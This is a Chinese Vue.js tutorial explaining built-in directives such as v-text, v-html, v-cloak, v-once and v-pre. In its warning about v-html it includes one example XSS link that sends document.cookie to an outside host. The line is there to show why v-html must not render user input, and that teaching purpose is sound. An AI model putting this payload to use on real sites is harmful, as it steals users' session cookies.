# vue其他内置指令

vue中存在两种类型指令，一个叫“内置指令”,本质上就是vue官方提供给我们的指令，例如`v=bind`,`v-model`等等。还有一种指令叫做“自定义指令”，这种指令是用户自己自定义出来的，vue官方没有提供。这一节，一些常见的内置指令梳理一下。

基于前面文档，我们已经知道了：

   1. `v-bind :` 单向绑定解析表达式, 可简写为 `:xxx`

   2. `v-model : `双向数据绑定

   3.  `  v-for: `遍历数组/对象/字符串

   4.  `  v-on: `绑定事件监听, 可简写为`@`

   5.  ` v-if: `条件渲染（动态控制节点是否存存在）

   6. `v-else: `条件渲染（动态控制节点是否存存在）

   7. `v-show:` 条件渲染 (动态控制节点是否展示)

      

  ### v-text指令

作用：向其所在的节点中渲染文本内容。

与插值语法的区别：

1. v-text会替换掉节点中的内容，而差值语法则不会
2. v-text中会把其对应变量的值完全当成一个字符串，即使里面有标签属性，也不会解析。

例如：

```html {4,5}
			...
		<div id="root">
			<div>你好，{{name}}</div>
			<!-- 以下div会完全被替换成 “spdb”，“你好”不会被展示 -->
			<div v-text="name">你好，</div>
			<!-- 以下div会完全被替换成 “<h3>你好啊！</h3>”，<h3>标签不会被解析 -->
			<div v-text="str">
		 </div>
			...
			new Vue({
			el:'#root',
			data:{
				name:'spdb',
				str:'<h3>你好啊！</h3>'
			}
		})
```

###  v-html指令

作用：向指定节点中渲染包含html结构的内容。

与插值语法的区别：

1. `v-html`会替换掉节点中所有的内容，{{xx}}则不会。
2. `v-html`可以识别html结构。

与`v-text`的区别:`v-html`会解析变量中包含的html结构内容。

例如：

```html
<div id="root">
			<div>你好，{{name}}</div>
			<!--str:'<h3>你好啊！</h3>'-->
			<div v-html="str"></div>
		</div>
```

此时h3标签会被解析。

::: danger

请注意：`v-html`指令有**安全性**问题！！！！！！！

一般少用，在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！！

Q：为什么是危险的？

A:  这个跟cookie本身的安全性有关。cookie是一个网站用来用户验证的重要手段，当有人窃取到你的cookie时，就可以伪造你的身份，以你身份来登陆相关网站而无需验证。

Q:如何伪造cookie？

A:恰恰就是因为v-html会解析变量中所有的标签。在js中，是可以通过document.cookie来得到当前网站的所有cookie数据的，想想以下，如果我是黑客，当你点击了如下代码生成的内容时：

```html
<a href=javascript:location.href="http://www.mantu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>
```

此时就会把当前网站你所有的，可以不通过http请求拿到的cookie通通拿到，并上传到mantu.com，是不是觉得很可怕？

:::

附：关于cookie的详细解释，可观看如下视频：

<iframeComp ihtml="https://upos-sz-mirrorhw.bilivideo.com/upgcxcode/68/32/235543268/235543268-1-208.mp4?e=ig8euxZM2rNcNbRVhwdVhwdlhWdVhwdVhoNvNC8BqJIzNbfq9rVEuxTEnE8L5F6VnEsSTx0vkX8fqJeYTj_lta53NCM=&uipk=5&nbs=1&deadline=1636885770&gen=playurlv2&os=hwbv&oi=17808763&trid=761a62f8e1e041928630da1ebf81c570T&platform=html5&upsig=4a8a3388e8e66662d09e2036613c436c&uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform&mid=0&bvc=vod&nettype=0&bw=69507&orderid=0,1&logo=80000000"></iframeComp>

### v-cloak指令

               1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
               2. 使用css配合v-cloak可以解决网速慢时页面展示出差值语法慢的问题。

### v-once指令

   1. v-once所在节点在初次动态渲染后，就视为静态内容了

   2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

      例如：

      ```html
      	   <div id="root">
                 <!--本行代码在第一次动态渲染之后不会再次渲染，会被视为静态内容。故其值永远为n的初始值-->
      			<h2 v-once>初始化的n值是:{{n}}</h2>
                 <!--本行代码可以后续正常渲染-->
      			<h2>当前的n值是:{{n}}</h2>
      			<button @click="n++">点我n+1</button>
      		</div>
      ```

       ### v-pre指令

1. 跳过其所在节点的编译过程。

2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

   例如：

   ```html
   		<div id="root">
               <!--本行代码没有使用vue中渲染的任何值，所以可以使用v-pre指令跳过该节点的编译-->
   			<h2 v-pre>Vue其实很简单</h2>
               <!--本行代码使用vue中渲染的值，所以不会使用v-pre,如果也使用了v-pre,那么该行也会被跳过，差值语法将显示为"{{n}}"，而不是n的值-->
   			<h2 >当前的n值是:{{n}}</h2>
   			<button @click="n++">点我n+1</button>
   		</div>
   ```

   

​         

​            

